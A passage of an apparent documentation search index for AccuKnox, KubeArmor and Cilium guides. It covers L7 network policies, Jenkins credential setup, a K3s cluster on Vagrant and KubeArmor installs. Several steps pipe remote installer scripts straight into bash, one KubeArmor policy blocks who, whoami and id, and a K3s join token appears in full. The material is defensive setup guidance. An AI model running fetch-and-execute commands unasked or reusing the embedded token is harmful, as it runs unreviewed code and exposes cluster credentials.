</code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Explore the policy</p> <pre><code>cat sample-cilium-ingress-policy.yaml\n</code></pre> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"rule1-ingress\"\nspec:\ndescription: \"L7 policy to restrict access to specific HTTP call\"\nendpointSelector:\nmatchLabels:\nclass: deathstar\ningress:\n- toPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\nrules:\nhttp:\n- method: \"POST\"\npath: \"/v1/request-landing\"\n</code></pre> <p></p> <p>3. Apply the policy</p> <pre><code>kubectl apply -f sample-cilium-ingress-policy.yaml </code></pre> <p></p> <p>4. Policy violation</p> <pre><code>kubectl get svc </code></pre> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.100.255.199/v1/request-landing\n</code></pre> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.100.255.199/v1/bye </code></pre> <p>5. Cilium SVC port forward to Monitor the logs</p> <pre><code>cilium hubble port-forward\n</code></pre> <p></p> <p>6. Monitoring the Cilium Violation logs</p> <pre><code>hubble observe -f --protocol http --pod tiefighter\n</code></pre> <p></p>"},{"location":"open-source/gitops/AWS-user-credential-and-Jenkins-Integration/","title":"AWS user credential and Jenkins Integration","text":"<p>As a prerequisites, It is required to create IAM user in AWS to generate access key and secret access key.</p> <p>Creating an IAM user in your AWS account</p>"},{"location":"open-source/gitops/AWS-user-credential-and-Jenkins-Integration/#to-integrate-with-jenkins-credentials","title":"To integrate with Jenkins credentials","text":"<p> Open Jenkins Server </p> <p> Go to Dashboard  Manage Jenkins  Manage Credentials</p> <p>  Choose global configuration and Add Credentials</p> <p> Choose secret text as kind and fill the access key with desire ID that is used in apply.yaml. Similarly, repeat the same for secret access key. </p> <p></p>"},{"location":"open-source/gitops/GCP-Service-Account-and-Jenkins-Integration/","title":"GCP Service Account and Jenkins Integration","text":"<p>As a prerequisites, It is required to have GCP service account and its key.</p> <p>Creating and managing service accounts</p> <p>Creating and managing service account keys</p>"},{"location":"open-source/gitops/GCP-Service-Account-and-Jenkins-Integration/#to-integrate-with-jenkins-credentials","title":"To integrate with Jenkins credentials","text":"<p> Open Jenkins Server </p> <p> Go to Dashboard  Manage Jenkins  Manage Credentials</p> <p>  Choose global configuration and Add Credentials</p> <p> Choose Secret file as kind and provide the ID that is used in apply.yaml</p> <p></p>"},{"location":"open-source/gitops/gitops/","title":"GitOps Workflow for Policy Template","text":""},{"location":"open-source/gitops/gitops/#objective","title":"Objective","text":"<p>The main goal is to setup end to end GitOps workflow with few steps for applying policies on instances in an automated way. The policies that are promoted here are from the open source kubearmor's policy-template repository.</p> <p>To know more about policty tempates.  Visit the official site</p>"},{"location":"open-source/gitops/gitops/#step-1-generate-script","title":"Step 1: Generate Script","text":"<p> What is the policy-template CLI?</p> <p>Policy-template is a command-line utility that lets the user generate the necessary policies and provides the automation scripts in order to set up a pipeline in Jenkins.</p> <p> Download policy-template CLI utility</p> <p>Run the following command to download the policy-template GitOps CLI utility.</p> <pre><code>sudo curl -o policy-template https://storage.googleapis.com/policy-gitops/latest/policy-template &amp;&amp; sudo chmod a+x policy-template | sudo mv policy-template /usr/bin\n</code></pre> <p> Generate policy-template</p> <p>Run the below command to generate desire policy template.</p> <pre><code>sudo policy-template generate &lt;template-name&gt;\n</code></pre> Example <p>The below command generates a policy template with the directory name sample. <pre><code>sudo policy-template generate sample\n</code></pre></p>  GKE EKS <p></p>  apply.yaml <pre><code>gke:\nprojectId: \"\"\ncluster: name: \"\"\nlocation: \"\"\nauth:\nserviceAccountId: \"\"\ndelete: false | true    </code></pre> Attribute Description gke.projectId GCP project id gke.cluster.name GKE cluster name gke.cluster.location GKE cluster location gke.auth.serviceAccountId Jenkins credential Id in which the GCP service account key is stored as a secret file delete Applied polices on instance gets deleted if it is true <p> To setup service account id in Jenkins credential</p> <p> </p>  apply.yaml <pre><code>eks:\ncluster: name: \"\"\nlocation: \"\"\nauth:\naccessKeyId: \"\"\nsecretAccessKey: \"\" delete: true | false    </code></pre> Attribute Description eks.cluster.name EKS cluster name gke.cluster.location EKS cluster location eks.auth.accessKeyId AWS access key jenkins credential ID eks.auth.secretAccessKey AWS secret access key jenkins credential ID delete Applied polices on instance gets deleted if it is true <p> To setup access key and secret access key in Jenkins credential</p> <p>Jenkinsfile with automation script is auto generated and reads the value provided in the apply.yaml</p> <p>To update the exsisting template</p> <p>The below command will let the user to add or update the policies in the existing template. <pre><code>sudo policy-template update &lt;template-name&gt;\n</code></pre></p> <p>Example <pre><code>sudo policy-template update sample\n</code></pre></p> <p>To delete the applied policies</p> <p>The below command will let the user to delete the policies in the existing template by Jenkins pipeline, once it is pushed to the remote SCM.</p> <pre><code>sudo policy-template delete &lt;template-name&gt;\n</code></pre> <p>Example <pre><code>sudo policy-template delete sample\n</code></pre>     Once it is pushed to SCM, Jenkins will delete the policies.      </p>"},{"location":"open-source/gitops/gitops/#step-2-push-to-remote-scm","title":"Step 2: Push to remote SCM","text":"<p>Run the below command to initiate and push the changes to GitHub.</p> <pre><code>sudo policy-template init github\n</code></pre>  Github <p> </p>"},{"location":"open-source/gitops/gitops/#step-3-integrate-with-automation-tool","title":"Step 3: Integrate with Automation tool","text":"<p>Below steps are the instruction to create a pipelien in Jenkins</p> <p>Create an item as a multi-branch pipeline and provide the job name.</p> <p></p> <p>Integrate the remote SCM in it. </p> <p></p> <p>The branch with the Jenkinsfile in the template appears in the job list.</p> <p></p> <p>Click Build Now or Configure webhook for auto-trigger. This applies the policies on the configured instance in apply.yaml file.</p> <p></p>"},{"location":"open-source/gke-cos/cos/","title":"Cos","text":""},{"location":"open-source/gke-cos/cos/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on GKE with COS and Ubuntu by applying policies on kubernetes workloads.</p>"},{"location":"open-source/gke-cos/cos/#step-1-install-daemonsets-services","title":"Step 1: Install Daemonsets &amp; Services","text":"<pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash\n</code></pre> <p>Note: This will Install all the components.</p>"},{"location":"open-source/gke-cos/cos/#step-2-verify-the-installation","title":"Step 2: Verify the Installation","text":"<pre><code>Kubectl get pods -A\n</code></pre>"},{"location":"open-source/gke-cos/cos/#step-3-install-sample-k8s-application","title":"Step 3: Install sample K8's Application","text":"<pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml\n</code></pre>"},{"location":"open-source/gke-cos/cos/#step-4-verify-the-installation","title":"Step 4: Verify the Installation","text":"<pre><code>kubectl get pods -n wordpress-mysql\n</code></pre>"},{"location":"open-source/gke-cos/cos/#step-5-get-auto-discovered-policies","title":"Step 5: Get Auto discovered policies","text":"<pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash\n</code></pre>"},{"location":"open-source/gke-cos/cos/#step-6-applying-auto-discovered-policies-on-cluster","title":"Step 6: Applying Auto discovered policies on Cluster","text":"<p>These policies can then be applied on the k8s cluster running KubeArmor and Cilium.</p> <p>Auto-discovery-policy service will audit the process and network and will give policies to allow only those processes and network.</p> <p>Apply Kubearmor policy:</p> <pre><code>kubectl apply -f kubearmor_policies_default_wordpress-mysql_wordpress_divgfyof.yaml\n</code></pre> <p></p> <p>Apply Cilium policy:</p> <pre><code>kubectl apply -f cilium_policies.yaml\n</code></pre> <p>To list applied policies,</p> <p><pre><code>kubectl get ksp,cnp -A\n</code></pre> </p> <p>To uninstall all the services Installed:</p> <pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash\n</code></pre> <pre><code>kubectl delete -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml\n</code></pre>"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/","title":"Jenkins Plugin: AccuKnox Policy Tool","text":"<p>Allows you to apply or push AccuKnox Auto-discovered and Policy-Template policies to the Kubernetes cluster or GitHub repository of your choosing.</p> <pre><code>// Example when used in a pipeline\nnode {\n  stage('AccuKnox Policy push to GitHub') {\n    steps {           \n      KnoxAutoPol(useAutoApply: false, pushToGit: true, gitBaseBranchName: deploy-demo ,gitBranchName: demobranch, gitToken: gh_demotoken, gitRepoUrl: https://github.com/demouser/demorepo.git, gitUserName: demouser )\n    }\n  }\n}\n</code></pre> <p>\ud83d\udcdd Source code can be found on accuknox/jenkins-integration</p>"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#prerequisites","title":"Prerequisites","text":"<ul> <li>A Jenkins installation running version 2.164.1or higher (with jdk8 or jdk11).</li> <li>A node with Kubectl configured    </li> <li>A Kubernetes cluster. [ Optional ]    </li> <li>A GitHub token with read/write permission    </li> <li>A GitHub repository to update the policies</li> </ul>"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#how-it-works","title":"How it works","text":"<p>Once the build starts, the plugin generates a set of AccuKnox policies [ consisting of KubeArmor and Cilium Policies ]. The policy files are stored in <code>/tmp/accuknox-client-repo/&lt;repo-name&gt;</code> and will be deleted once the GitHub push is completed. The plugin also creates temporary files under <code>$USER/$CURRENT_DIR</code>.</p> <p>The plugin makes use of 3 modules</p> <ol> <li> <p>Auto-Discover: This module helps the auto-discovery of AccuKnox policies based on the workloads that are present in the current Kubernetes cluster. This module makes use of auto-discovery scripts outline in  AccuKnox help section.</p> <ol> <li> <p>Install Daemonsets and Services</p> </li> <li> <p>Get Auto Discovered Policies</p> </li> </ol> <p>The output is stored into a new folder ad-policy under the current working directory and is transferred to the GitHub repo under <code>/tmp/accuknox-client-repo/&lt;repo_name&gt;</code></p> </li> <li> <p>Policy-Templates: This module is responsible for downloading the latest updates from the policy-template repository and shortlisting policies that are relevant to the workloads that are present in the current Kubernetes cluster. This module also automatically replaces the name, namespace, and label field with that of the current Kubernetes cluster so that the policies are enforceable.</p> </li> <li> <p>Git-Operations: The git operation module ensures that the updated policies are pushed to a new branch and creates and merges a PR to the CD-enabled branch of the users choosing.</p> </li> </ol>"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#quick-usage-guide","title":"Quick Usage Guide","text":""},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#parameters","title":"Parameters","text":"Name Mandatory Description 1 <code>gitBaseBranchName</code> yes The GitHub base branch name to which PR needs to be created and merged 2 <code>gitBranchName</code> yes The GitHub branch name to which new updates are to be pushed 3 <code>gitToken</code> yes GitHub token with read/write permission 4 <code>gitRepoUrl</code> yes GitHub base repository URL for cloning and updating the values. eg: https://github.com/owner_info/repo_name.git 5 <code>gitUserName</code> yes GitHub username/organization name to which the repository belongs. 6 <code>useAutoApply</code> no Boolean flag. Turn on to apply the generated policies to the cluster directly. 7 <code>pushToGit</code> yes Boolean flag. Checking this flag is required if the policies need to be updated to the GitHub repository"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#using-the-plugin-in-a-pipeline","title":"Using the Plugin in a Pipeline","text":"<p>The AccuKnox-CLI plugin provides the function KnoxAutoPol() for Jenkins Pipeline support. You can go to the Snippet Generator page under the Pipeline Syntax section in Jenkins, select KnoxAutoPol: Setup AccuKnox CLI from the Sample Step dropdown, and it will provide you configuration interface for the plugin. After filling the entries and clicking Generate Pipeline Script button, you will get the sample scripts that can be used in your Pipeline definition.</p> <p>Example:</p> <pre><code>node {\n  stage('AccuKnox Policy push to GitHub') {\n    steps {           \n      KnoxAutoPol(useAutoApply: false, \n          pushToGit: true, \n          gitBaseBranchName: deploy-demo, \n          gitBranchName: demobranch, \n          gitToken: gh_demotoken, \n          gitRepoUrl: https://github.com/demouser/demorepo.git, \n          gitUserName: demouser )\n    }\n  }\n}\n</code></pre>"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#using-the-plugin-from-the-web-interface","title":"Using the Plugin from the Web Interface","text":"<ol> <li>Within the Jenkins dashboard, select a Job and then select \"Configure\"    </li> <li>Scroll down to the \"Build\" section    </li> <li>Select \"AccuKnox CLI\"    </li> <li>In the checkbox, select which is applicable (eg. Push to GitHub )    </li> <li>Open the Advanced tab    </li> <li>Fill in the necessary details like GitHub username, token, etc    </li> <li>Save</li> </ol>"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#development","title":"Development","text":""},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#building-and-testing","title":"Building and testing","text":"<p>Clone the GitHub repository</p> <pre><code>git clone git@github.com:accuknox/jenkins-integration.git\n</code></pre> <p>Change directory to jenkins-integration</p> <pre><code>cd jenkins-integration\n</code></pre> <p>To build the extension, run:</p> <pre><code>mvn clean package\n</code></pre> <p>and upload target/knoxautopol.hpi to your Jenkins installation.</p> <p>To run the tests:</p> <pre><code>mvn clean test\n</code></pre>"},{"location":"open-source/jenkins-plugin-integration/jenkins-plugin-integration/#performing-a-release","title":"Performing a Release","text":"<pre><code>mvn release:prepare release:perform\n</code></pre> <p>For a complete guide on how to configure and use the plugin please refer to our blog Jenkins Integration with AccuKnox Policy Tool Plugin.</p>"},{"location":"open-source/k3s/k3s/","title":"K3s","text":""},{"location":"open-source/k3s/k3s/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on K3's by applying policies on kubernetes workloads.</p>"},{"location":"open-source/k3s/k3s/#step-1-install-virtualbox","title":"Step 1: Install Virtualbox","text":"<pre><code>sudo apt-get install virtualbox -y\n</code></pre>"},{"location":"open-source/k3s/k3s/#step-2-install-vagrant","title":"Step 2: Install Vagrant","text":"<pre><code>wget https://releases.hashicorp.com/vagrant/2.2.14/vagrant_2.2.14_x86_64.deb\n</code></pre> <pre><code>sudo apt install ./vagrant_2.2.14_x86_64.deb\n</code></pre> <pre><code>vagrant \u2013version\n</code></pre> <pre><code>vagrant plugin install vagrant-scp\n</code></pre> <pre><code>vagrant plugin list\n</code></pre>"},{"location":"open-source/k3s/k3s/#step-3-configure-ubuntu-on-vagrant-virtualbox","title":"Step 3: Configure Ubuntu on Vagrant Virtualbox","text":"<pre><code>nano VagrantFile\n</code></pre> <pre><code># -*- mode: ruby -*-\n# vi: set ft=ruby :\n\nENV['VAGRANT_NO_PARALLEL'] = 'yes'\n\nVagrant.configure(2) do |config|\n\nNodeCount = 2\n\n(1..NodeCount).each do |i|\nconfig.vm.define \"ubuntuvm#{i}\" do |node|\nnode.vm.box               = \"generic/ubuntu2004\"\nnode.vm.box_check_update  = false\nnode.vm.box_version       = \"3.3.0\"\nnode.vm.hostname          = \"ubuntuvm#{i}.example.com\"\nnode.vm.network \"private_network\", ip: \"192.168.56.4#{i}\"\nnode.vm.provider \"virtualbox\" do |v|\nv.name    = \"ubuntuvm#{i}\"\nv.memory  = 1024\nv.cpus    = 1\nend\n\nend\n\nend\n\nend\n</code></pre> <pre><code>vagrant up\n</code></pre> <pre><code>vagrant ssh ubuntu1\n</code></pre>"},{"location":"open-source/k3s/k3s/#step-4-install-k3s-on-ubuntuvm","title":"Step 4: Install K3's on Ubuntuvm","text":"<pre><code>vagrant ssh ubuntuvm1\n</code></pre> <pre><code>curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC=\"--node-ip=192.168.56.41 --flannel-iface=eth1\" sh -s - --write-kubeconfig-mode 644\n</code></pre> <p>Note: node-ip=192.168.56.41 \u2192 ubuntuvm1 ip</p> <p></p> <pre><code>systemctl status k3s\n</code></pre> <pre><code>which kubectl\n</code></pre> <pre><code>kubectl get nodes\n</code></pre> <pre><code>cat  /var/lib/rancher/k3s/server/token </code></pre> <p></p> <pre><code>exit\n</code></pre> <pre><code>vagrant scp ubuntuvm1:/etc/rancher/k3s/k3s.yaml ~/.kube/config\n</code></pre> <pre><code>nano ~/.kube/config\n</code></pre> <p>Change the Server: 127.0.0.1 to 192.168.56.41</p> <pre><code>kubectl get nodes\n</code></pre> <p>Login in to Ubuntuvm2 </p> <pre><code>vagrant ssh ubuntuvm2\n</code></pre> <pre><code>ip a show\n</code></pre> <pre><code>curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC=\"--node-ip=192.168.56.42 --flannel-iface=eth1\" K3S_URL=\"https://192.168.56.41:6443\" K3S_TOKEN=\"K107b9ecf5076c2a0c79760aa0e545d7464f11bbd27c643b1f1b8eef34758af1b89::server:985d51052287fd7554e989bd742c7f31\"  sh -\n</code></pre> <p>Note:  IP &amp; Token may change</p> <pre><code>exit\n</code></pre> <pre><code>kubectl get nodes\n</code></pre> <p></p>"},{"location":"open-source/k3s/k3s/#step-5-karmor-install","title":"Step 5: Karmor Install","text":"<p>Install Karmor CLI: </p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <pre><code>karmor install  </code></pre> <p></p> <p>Karmor Verify: </p> <p><pre><code>kubectl get pods -n kube-system | grep kubearmor\n</code></pre> </p>"},{"location":"open-source/k3s/k3s/#step-6-cilium-install","title":"Step 6: Cilium Install","text":"<pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>sha256sum --check cilium-linux-amd64.tar.gz.sha256sum\n</code></pre> <pre><code>sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <p><pre><code>cilium install </code></pre> </p> <p>Cilium Verify: </p> <pre><code>kubectl get pods -n kube-system | grep cilium </code></pre> <p></p> <p>Cilium Hubble Enable: </p> <pre><code>cilium hubble enable\n</code></pre> <p></p> <p>Cilium Hubble Verify: </p> <pre><code>kubectl get pods -n kube-system | grep hubble\n</code></pre> <p></p>"},{"location":"open-source/k3s/k3s/#step-7-kubearmor-policy","title":"Step 7: Kubearmor Policy","text":"<p>1. Create a nginx deployment</p> <pre><code>kubectl create deployment nginx --image nginx\n</code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Apply the following policy</p> <pre><code>nano nginx-kubearmor-policy.yaml  </code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy\n# namespace: accuknox-agents # Change your namespace\nspec:\ntags: [\"MITRE\", \"T1082\"]\nmessage: \"System owner discovery command is blocked\"\nselector:\nmatchLabels:\napp: nginx # use your own label here\nprocess:\nseverity: 3\nmatchPaths:\n- path: /usr/bin/who\n- path: /usr/bin/w\n- path: /usr/bin/id\n- path: /usr/bin/whoami\naction: Block\n</code></pre> <p></p> <p>3. Apply the policy</p> <p></p> <pre><code>kubectl apply -f nginx-kubearmor-policy.yaml  </code></pre> <pre><code>kubectl get ksp\n</code></pre> <p></p> <p>Note: Policy will work based on  matched lables  Ex: (app: nginx)</p> <p>4. Violating the policy</p> <pre><code>kubectl exec -it nginx-766b69bd4b-8jttd -- bash  </code></pre> <p></p> <p>Kubearmor SVC port forward to Monitor the logs </p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <p>Verifying policy Violation logs</p> <pre><code>karmor log\n</code></pre> <p></p> <p></p>"},{"location":"open-source/k3s/k3s/#step-8-cilium-policy","title":"Step 8: Cilium Policy","text":"<p>1. Create a tightfighter &amp; deathstart deployment</p> <pre><code>nano tightfighter-deathstart-app.yaml\n</code></pre> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\ntype: ClusterIP\nports:\n- port: 80\nselector:\norg: empire\nclass: deathstar\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\nreplicas: 2\nselector:\nmatchLabels:\norg: empire\nclass: deathstar\ntemplate:\nmetadata:\nlabels:\norg: empire\nclass: deathstar\napp.kubernetes.io/name: deathstar\nspec:\ncontainers:\n- name: deathstar\nimage: docker.io/cilium/starwars\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: tiefighter\nlabels:\norg: empire\nclass: tiefighter\napp.kubernetes.io/name: tiefighter\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: xwing\nlabels:\napp.kubernetes.io/name: xwing\norg: alliance\nclass: xwing\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n</code></pre> <pre><code>kubectl apply -f tightfighter-deathstart-app.yaml </code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Apply the following policy</p> <pre><code>nano sample-cilium-ingress-policy.yaml                                </code></pre> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"rule1-ingress\"\nspec:\ndescription: \"L7 policy to restrict access to specific HTTP call\"\nendpointSelector:\nmatchLabels:\nclass: deathstar\ningress:\n- toPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\nrules:\nhttp:\n- method: \"POST\"\npath: \"/v1/request-landing\"\n</code></pre> <p></p> <p>3. Apply the policy</p> <pre><code>kubectl apply -f sample-cilium-ingress-policy.yaml   </code></pre> <p></p> <pre><code>kubectl get cnp\n</code></pre> <p></p> <p>4. Violating the policy</p> <pre><code>kubectl get svc\n</code></pre> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.100.255.199/v1/request-landing </code></pre> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.100.255.199/v1/bye </code></pre> <p></p> <p>Cilium SVC port forward to Monitor the logs </p> <pre><code>cilium hubble port-forward\n</code></pre> <p></p>"},{"location":"open-source/k3s/k3s/#step-9-install-the-hubble-cli-client","title":"Step 9: Install the Hubble CLI Client","text":"<pre><code>exportHUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)\n</code></pre> <pre><code>curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>sha256sum --check hubble-linux-amd64.tar.gz.sha256sum\n</code></pre> <pre><code>sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre>"},{"location":"open-source/k3s/k3s/#step-10-monitoring-the-cilium-voilation-logs","title":"Step 10: Monitoring the Cilium voilation logs","text":"<pre><code>hubble observe -f --protocol http --pod tiefighter\n</code></pre>"},{"location":"open-source/kubearmor/bullseye/","title":"Debian 11 (Bullseye)","text":""},{"location":"open-source/kubearmor/bullseye/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on Debian 11 (Bullseye) with 5.10 Kernel Version by applying policies on VM workloads.</p>"},{"location":"open-source/kubearmor/bullseye/#step-1-install-kubearmor-on-vm","title":"Step 1: Install Kubearmor on VM","text":"<pre><code>sudo apt install bpfcc-tools linux-headers-$(uname -r)\n</code></pre> <p>Download the Latest release of KubeArmor</p> <pre><code>wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb\n</code></pre> <p></p> <pre><code>dpkg -i kubearmor_0.3.1_linux-amd64.deb </code></pre> <p>Note: While Installing if you get the following error,</p> <p></p> <p>Run the following command.</p> <pre><code>$apt --fix-broken install    to fix the error &amp; \nreinstall $dpkg -i kubearmor_0.3.1_linux-amd64.deb </code></pre> <p></p> <p>Start and Check the status of Kubearmor:</p> <pre><code>sudo systemctl start kubearmor\n</code></pre> <pre><code>sudo systemctl enable kubearmor\n</code></pre> <pre><code>sudo systemctl status kubearmor\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/bullseye/#step-2-apply-and-verify-kubearmor-system-policy","title":"Step 2: Apply and Verify Kubearmor system policy","text":"<pre><code>cat khp-example-vmname.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: khp-02\nspec:\nseverity: 5\nfile:\nmatchPaths:\n- path: /proc/cpuinfo\naction:\nBlock\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add khp-example-vmname.yaml\n</code></pre>"},{"location":"open-source/kubearmor/bullseye/#step-3-policy-violation","title":"Step 3: Policy Violation","text":"<p>With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below.</p> <pre><code>cat /proc/cpuinfo\n</code></pre> <p></p> <p>Verifying policy Violation logs:</p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/buster/","title":"Debian 10 (Buster)","text":""},{"location":"open-source/kubearmor/buster/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on Debian 10 (Buster) with 4.19 Kernel Version by applying policies on VM workloads.</p>"},{"location":"open-source/kubearmor/buster/#step-1-install-kubearmor-on-vm","title":"Step 1: Install Kubearmor on VM","text":"<p>Install pre-requisites:</p> <ul> <li>Repositories: /etc/apt/sources.list should include the non-free repository and look something like this:</li> </ul> <pre><code>vi /etc/apt/sources.list\n</code></pre> <p>Add the following:</p> <pre><code>deb http://deb.debian.org/debian sid main contrib non-free\n</code></pre> <pre><code>deb-src http://deb.debian.org/debian sid main contrib non-free\n</code></pre> <p></p> <p>Install Build dependencies:</p> <pre><code>apt-get update\n</code></pre> <p>According to debian.org</p> <pre><code>sudo apt-get install arping bison clang-format cmake dh-python \\\ndpkg-dev pkg-kde-tools ethtool flex inetutils-ping iperf \\\nlibbpf-dev libclang-dev libclang-cpp-dev libedit-dev libelf-dev \\\nlibfl-dev libzip-dev linux-libc-dev llvm-dev libluajit-5.1-dev \\\nluajit python3-netaddr python3-pyroute2 python3-distutils python3\n</code></pre> <p>Install and Compile BCC:</p> <pre><code>git clone https://github.com/iovisor/bcc.git\n</code></pre> <pre><code>mkdir bcc/build; cd bcc/build\n</code></pre> <pre><code>sudo make install\n</code></pre> <pre><code>cmake ..\n</code></pre> <pre><code>make\n</code></pre> <p>Install linux-headers:</p> <pre><code>sudo apt install linux-headers-$(uname -r)\n</code></pre> <p>Note: If youre getting this following error,</p> <p></p> <p>Follow this steps to slove the error.</p> <pre><code>sudo make install\n</code></pre> <pre><code>apt install gcc-8\n</code></pre> <p></p> <pre><code>sudo apt install linux-headers-$(uname -r)\n</code></pre> <p></p> <p>Download the Latest release of KubeArmor</p> <pre><code>wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb\n</code></pre> <p></p> <pre><code>dpkg -i kubearmor_0.3.1_linux-amd64.deb </code></pre> <p>Note: While Installing if you get the following error,</p> <p></p> <p>Run the following command to fix the error.</p> <pre><code>apt --fix-broken install   </code></pre> <pre><code>dpkg -i kubearmor_0.3.1_linux-amd64.deb </code></pre> <p></p> <p>Start and Check the status of Kubearmor:</p> <pre><code>sudo systemctl start kubearmor\n</code></pre> <pre><code>sudo systemctl enable kubearmor\n</code></pre> <pre><code>sudo systemctl status kubearmor\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/buster/#step-2-apply-and-verify-kubearmor-system-policy","title":"Step 2: Apply and Verify Kubearmor system policy","text":"<pre><code>cat khp-example-vmname.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: hsp-kubearmor-dev-proc-path-block\nspec:\nprocess:\nmatchPaths:\n- path: /usr/bin/sleep # try sleep 1\naction:\nBlock\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm policy add khp-example-vmname.yaml\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/buster/#step-3-policy-violation","title":"Step 3: Policy Violation","text":"<pre><code>sleep 10\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/cos/","title":"GKE with COS and Ubuntu","text":""},{"location":"open-source/kubearmor/cos/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on GKE with COS and Ubuntu by applying policies on Kubernetes workloads.</p>"},{"location":"open-source/kubearmor/cos/#step-1-install-daemonsets-services","title":"Step 1: Install Daemonsets &amp; Services","text":"<pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash\n</code></pre> <p>Note: This will Install all the components.</p>"},{"location":"open-source/kubearmor/cos/#step-2-verify-the-installation","title":"Step 2: Verify the Installation","text":"<pre><code>Kubectl get pods -A\n</code></pre>"},{"location":"open-source/kubearmor/cos/#step-3-install-sample-k8s-application","title":"Step 3: Install sample K8's Application","text":"<pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml\n</code></pre>"},{"location":"open-source/kubearmor/cos/#step-4-verify-the-installation","title":"Step 4: Verify the Installation","text":"<pre><code>kubectl get pods -n wordpress-mysql\n</code></pre>"},{"location":"open-source/kubearmor/cos/#step-5-get-auto-discovered-policies","title":"Step 5: Get Auto discovered policies","text":"<pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash\n</code></pre>"},{"location":"open-source/kubearmor/cos/#step-6-applying-auto-discovered-policies-on-cluster","title":"Step 6: Applying Auto discovered policies on Cluster","text":"<p>These policies can then be applied on the k8s cluster running KubeArmor.</p> <p>Auto-discovery-policy service will audit the process and network and will give policies to allow only those processes and network.</p> <p>Apply Kubearmor 